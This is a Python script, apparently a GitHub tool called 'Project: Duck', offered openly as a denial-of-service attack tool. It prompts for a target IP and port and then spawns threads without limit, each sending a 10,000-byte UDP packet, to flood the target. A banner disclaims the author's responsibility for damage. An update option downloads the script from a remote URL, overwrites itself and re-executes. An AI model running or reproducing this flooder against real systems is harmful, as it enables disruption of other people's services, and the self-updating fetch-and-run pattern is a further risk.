import socket
import threading
import os
import requests
import sys
import time

try:
    from colorama import Fore, Style
except Exception as e:
    exit(f"[ERROR] {e}")

GREEN = Fore.GREEN
RED = Fore.RED
BLUE = Fore.BLUE
YELLOW = Fore.YELLOW
PURPLE = Fore.MAGENTA
RESET = Style.RESET_ALL

BANNER = YELLOW + f"""
⠀⠀⠀⠀⠀⠀⣀⣤⣶⣶⣤⡀
⠀⠀⠀⠀⢀⣾⠛⠁⢰⣧⡈⢻⣦
⠀⠀⠀⠀⢸⣇⣼⡀⠻⠟⠁⠀⢻⡆          {PURPLE}PROJECT: DUCK{YELLOW}
⠀⠀⠀⢀⡞⣹⠙⣧⡀⠀⠀⡀⢸⡇          {PURPLE}AUTHOR: Oskar Opoński | https://github.com/oskaroponski{YELLOW}
⠀⣀⡴⠋⠀⣀⣴⣿⡷⠴⠞⠁⢸⡇          {RED}THE AUTHOR DOES NOT BEAR THE CONSEQUENCES FOR ANY DAMAGE!{YELLOW}
⢾⣁⣀⡤⠾⠛⠁⣸⠀⠀⠀⠀⢸⡇
⠈⠁⠀⠀⠀⠀⢠⡟⠀⠀⠀⠀⣾⠃
⠀⠀⠀⠀⠀⣠⣿⠁⠀⠀⠀⢀⣿
⠀⠀⠀⠀⣰⡿⠁⠀⠀⠀⠀⠀⢿⣶⠶⠿⠟⠿⠿⣶⣦⣄⡀
⠀⠀⠀⣼⠟⠀⠀⠀⠀⠀⠀⠀⠈⠻⣄⠀⠀⠀⠀⠀⠈⠙⠛⠿⠶⣶⣤⡀
⠀⠀⣸⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⢀⣀⣠⣤⣤⣤⣤⣤⣀⠀⠉⠙⠳⢦⣄⡀⣀⣤⣀⣀⡄
⠀⢀⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠁⠀⠀⠀⠀⠀⠈⠉⠻⢶⣀⠀⠀⠈⠉⢁⠈⠏⣿⣁
⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣦⣀⣀⡴⠁⠀⠀⢙⣿⡾
⠀⠘⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠀⠀⣀⣠⡾⠟⠃
⠀⠀⠹⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⡔⢊⣵⠞⠋⠁
⠀⠀⠀⠙⠿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠚⠉⠀⣠⣴⠟⠁
⠀⠀⠀⠀⠀⠈⠙⠳⠶⣤⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⢤⣤⣴⠊⣁⣤⠶⠛⠉
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⡷⢶⡶⠶⠤⠔⢺⠃⡟⠉⠉
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⠀⢰⡇⠀⡇⠀⠀⠀⢸⠀⠃
⠀⠀⠀⠀⠀⠀⠀⠀⠈⣹⣤⣭⠿⠟⣃⣾⠋⠀⠀⢠⡟⢸
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠈⠉⠙⠛⢋⣿⣙⣶⣾⡿⢷⡿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠛⠛⠻⠧⠶⠾⠛⠁
""" + RESET

def update():
    # GitHub URL for the updated __main__.py file
    url = "https://raw.githubusercontent.com/oskaroponski/Duck/main/__main__.py"
    local_file = "__main__.py"

    try:
        # Download the latest version of __main__.py
        response = requests.get(url)
        response.raise_for_status()  # Will raise an exception for bad status codes

        # Write the updated content to the local file
        with open(local_file, "wb") as f:
            f.write(response.content)

        print("[SUCCESS] Script updated successfully.")
        
        # Optionally, restart the script (if desired)
        print("[INFO] Restarting the script in 5s...")
        time.sleep(5)
        os.execv(sys.executable, ['python'] + sys.argv)  # This restarts the script

    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Failed to update the script: {e}")

def send_packets(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(b"A" * 10000, (ip, port))

    except Exception as e:
        exit(f"{RED}[ERROR] {e}{RESET}")

print(BANNER)

print("-1. Update")
print("0.  Exit")
print("1.  DDoS attack")

try:
    choice = int(input(f"{BLUE}[INPUT] Choice: {RESET}"))
except Exception as e:
    exit(f"{RED}[ERROR] {e}{RESET}")

if choice == -1:
    update()

if choice == 0:
    exit()

if choice == 1:
    try:
        ip = input(BLUE + "[INPUT] Target IP: " + RESET)
    except Exception as e:
        exit(f"{RED}[ERROR] {e}{RESET}")

    try:
        port = int(input(BLUE + "[INPUT] Target Port: " + RESET))
    except Exception as e:
        exit(f"{RED}[ERROR] {e}{RESET}")

    print(GREEN + "[SUCCESS] Starting attack... Press Ctrl+C to stop." + RESET)

    try:
        while True:
            thread = threading.Thread(target=send_packets, args=(ip, port))
            thread.start()

    except KeyboardInterrupt:
        print(RED + "\n[FAILED] Attack stopped." + RESET)
